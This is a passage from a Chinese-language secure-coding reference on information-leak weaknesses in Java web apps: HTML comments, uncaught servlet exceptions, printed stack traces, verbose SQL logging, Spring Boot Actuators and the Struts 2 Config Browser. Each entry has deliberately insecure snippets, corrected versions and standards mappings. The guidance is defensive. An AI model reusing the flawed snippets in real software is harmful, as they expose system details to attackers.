<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- TBD: this needs a security audit --&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;recalcOrbit&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>甚至那些看上去并非恶意的注释也可能有利于某些人了解系统的构建形式。</p>
<h5 id="RECOMMENDATIONS-34"><a href="#RECOMMENDATIONS-34" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用 JSP 注释来代替 HTML 注释（JSP 注释不会传递给用户）。</p>
<p>例 2：前面的示例已重写为使用 JSP 注释，该注释不会显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%-- TBD: this needs a security audit --%&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;recalcOrbit&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-36"><a href="#REFERENCES-36" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 615</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[3] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[16] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Incomplete-Servlet-Error-Handling"><a href="#System-Information-Leak-Incomplete-Servlet-Error-Handling" class="headerlink" title="System Information Leak: Incomplete Servlet Error Handling"></a>System Information Leak: Incomplete Servlet Error Handling</h4><h5 id="ABSTRACT-37"><a href="#ABSTRACT-37" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果 Servlet 未捕获到所有异常，则可能会泄漏调试信息，从而有利于攻击者进行攻击。</p>
<h5 id="EXPLANATION-37"><a href="#EXPLANATION-37" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当 Servlet 抛出一个异常时，Servlet 容器回传给用户的默认错误响应通常会包含调试信息。这些信息对于攻击者来说是十分有用的。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。</p>
<p>例 1：在以下方法中，DNS 解析失败会导致 Servlet 抛出一个异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost (HttpServletRequest req,</span><br><span class="line"></span><br><span class="line">                    HttpServletResponse res)</span><br><span class="line"></span><br><span class="line">              throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String ip = req.getRemoteAddr();</span><br><span class="line"></span><br><span class="line">    InetAddress addr = InetAddress.getByName(ip);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    out.println(&quot;hello &quot; + addr.getHostName());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：如果“name”参数并未包含在请求中，那么以下方法会抛出一个 NullPointerException 异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost (HttpServletRequest req,</span><br><span class="line"></span><br><span class="line">                    HttpServletResponse res)</span><br><span class="line"></span><br><span class="line">              throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String name = getParameter(&quot;name&quot;);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    out.println(&quot;hello &quot; + name.trim());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-35"><a href="#RECOMMENDATIONS-35" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>所有顶级 Servlet 方法都应捕获 Throwable，从而尽可能降低调用 Servlet 错误响应机制的可能性。</p>
<p>例 3：例 1 中的代码可以按以下方式进行重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost (HttpServletRequest req,</span><br><span class="line"></span><br><span class="line">                    HttpServletResponse res) &#123;</span><br><span class="line"></span><br><span class="line">      try &#123;</span><br><span class="line"></span><br><span class="line">          String ip = req.getRemoteAddr();</span><br><span class="line"></span><br><span class="line">          InetAddress addr = InetAddress.getByName(ip);</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">          out.println(&quot;hello &quot; + addr.getHostName());</span><br><span class="line"></span><br><span class="line">      &#125;catch (Throwable t) &#123;</span><br><span class="line"></span><br><span class="line">          logger.error(&quot;caught throwable at top level&quot;, t);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-37"><a href="#REFERENCES-37" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ernst Haselsteiner and Klemens Breitfuss Security in Near Field Communication (NFC): Strengths and Weaknesses</p>
<p>[2] ERR01-J. Do not allow exceptions to expose sensitive information CERT</p>
<p>[3] CONFIDENTIAL-1: Purge sensitive information from exceptions Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 209, CWE ID 431</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2)</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[12] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 209</p>
<p>[13] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 209</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Internal"><a href="#System-Information-Leak-Internal" class="headerlink" title="System Information Leak: Internal"></a>System Information Leak: Internal</h4><h5 id="ABSTRACT-38"><a href="#ABSTRACT-38" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-38"><a href="#EXPLANATION-38" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>通过打印或日志功能将系统数据或调试信息发送到本地文件、控制台或屏幕时，就会发生内部信息泄露。</p>
<p>例 1：以下代码针对标准的错误流输出了一个异常：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依据这一系统配置，该信息可转储到控制台，写成日志文件，或者显示给用户。在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一个数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。在上述例子中，泄露的信息可能会暗示操作系统的类型、系统上安装了哪些应用程序，以及管理员在配置应用程序时做了哪些方面的努力。</p>
<p>在移动世界，信息泄露也让人担忧。</p>
<p>例 2：以下代码记录在 Android 平台上捕获到的堆栈跟踪异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">    Log.e(TAG, Log.getStackTraceString(e));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-36"><a href="#RECOMMENDATIONS-36" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。此外，还要留意有关调试的跟踪信息，有时它可能出现在不明显的位置（例如嵌入在错误页 HTML 代码的注释行中）。</p>
<p>即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</p>
<h5 id="REFERENCES-38"><a href="#REFERENCES-38" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ernst Haselsteiner and Klemens Breitfuss Security in Near Field Communication (NFC): Strengths and Weaknesses</p>
<p>[2] ERR01-J. Do not allow exceptions to expose sensitive information CERT</p>
<p>[3] ENV02-J. Do not trust the values of environment variables CERT</p>
<p>[4] FUNDAMENTALS-4: Establish trust boundaries Oracle</p>
<p>[5] CONFIDENTIAL-1: Purge sensitive information from exceptions Oracle</p>
<p>[6] INPUT-1: Validate inputs Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Overly-Broad-SQL-Logging"><a href="#System-Information-Leak-Overly-Broad-SQL-Logging" class="headerlink" title="System Information Leak: Overly Broad SQL Logging"></a>System Information Leak: Overly Broad SQL Logging</h4><h5 id="ABSTRACT-39"><a href="#ABSTRACT-39" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>记录过多有关 SQL 查询的信息可能会泄露系统信息或危及用户隐私数据。</p>
<h5 id="EXPLANATION-39"><a href="#EXPLANATION-39" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL 查询不应记录在生产系统中。SQL 查询通常包含敏感信息，例如信用卡详细信息或社会保障号码。以明文形式记录这些信息可能会危及其保密性。</p>
<p>例 1： log4j.properties 文件中的以下条目将使所有查询都记录在 info 级别。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">log4j.logger.net.sf.hibernate.type=info</span><br><span class="line"></span><br><span class="line">log4j.logger.net.sf.hibernate.tool.hbm2ddl=info</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-37"><a href="#RECOMMENDATIONS-37" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应限制将 SQL 查询记录到 debug 级别，并注意不要让应用程序处于生产环境中的调试模式。</p>
<p>例 2：以下条目将使 Hibernate 查询记录在 debug 级别。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">log4j.logger.net.sf.hibernate.type=debug</span><br><span class="line"></span><br><span class="line">log4j.logger.net.sf.hibernate.tool.hbm2ddl=debug</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-39"><a href="#REFERENCES-39" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Red Hat Middleware, LLC Hibernate Reference Documentation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[3] Standards Mapping - FIPS200 AU</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.4</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.4, Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.4, Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.4, Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.4, Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.4, Requirement 6.5.5</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Spring-Boot-Actuators-Enabled"><a href="#System-Information-Leak-Spring-Boot-Actuators-Enabled" class="headerlink" title="System Information Leak: Spring Boot Actuators Enabled"></a>System Information Leak: Spring Boot Actuators Enabled</h4><h5 id="ABSTRACT-40"><a href="#ABSTRACT-40" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>启用 Spring Boot Actuator 可以揭示系统数据和调试信息，有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-40"><a href="#EXPLANATION-40" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Spring Boot Actuator 允许用户监控应用程序并与应用程序进行交互。多个不同的内置 Actuator 可以通过 HTTP 端点、JMX 或者甚至通过远程 Shell（SSH 或 Telnet）暴露系统数据和调试信息。攻击者可以利用此信息了解系统，并收集可用于攻击应用程序的信息。</p>
<h5 id="RECOMMENDATIONS-38"><a href="#RECOMMENDATIONS-38" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>配置 Acutator 时，始终要牢记安全性。如果 Actuator 揭示敏感数据，应将其标记为敏感，以便未经过身份验证的用户无法访问它。</p>
<p>示例：以下属性可用于将所有 Actuator 端点变成敏感端点：</p>
<p>endpoints.sensitive=true</p>
<p>在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。</p>
<h5 id="REFERENCES-40"><a href="#REFERENCES-40" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Spring Boot Reference Guide Spring</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="System-Information-Leak-Struts-2"><a href="#System-Information-Leak-Struts-2" class="headerlink" title="System Information Leak: Struts 2"></a>System Information Leak: Struts 2</h4><h5 id="ABSTRACT-41"><a href="#ABSTRACT-41" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>揭示系统数据或调试信息有助于攻击者了解系统并制定攻击计划。</p>
<h5 id="EXPLANATION-41"><a href="#EXPLANATION-41" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。</p>
<p>在这种情况下，Struts 2 Config Browser 在 Maven pom.xml 文件中配置，因此它是可用的，并且与应用程序一起部署。</p>
<p>Config Browser 插件是一个调试工具，用来帮助在运行时查看应用程序的配置。调试与配置相关的问题时，该工具非常有用，但其暴露了过多详细信息，可能帮助攻击者映射应用程序和构建应用程序的模型。</p>
<h5 id="RECOMMENDATIONS-39"><a href="#RECOMMENDATIONS-39" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在生产环境中，不应该部署 Config Browser。</p>
<h5 id="REFERENCES-41"><a href="#REFERENCES-41" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Struts 2 Config Browser Plugin Apache Struts 2</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001312, CCI-001314, CCI-002420, CCI-003272 </p>
<p>[5] Standards Mapping - FIPS200 CM </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SI-11 Error Handling (P2) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 8.3.4 Sensitive Private Data, 14.3.3 Unintended Security Disclosure Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.5 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.6 - Sensitive Data Retention </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II </p>
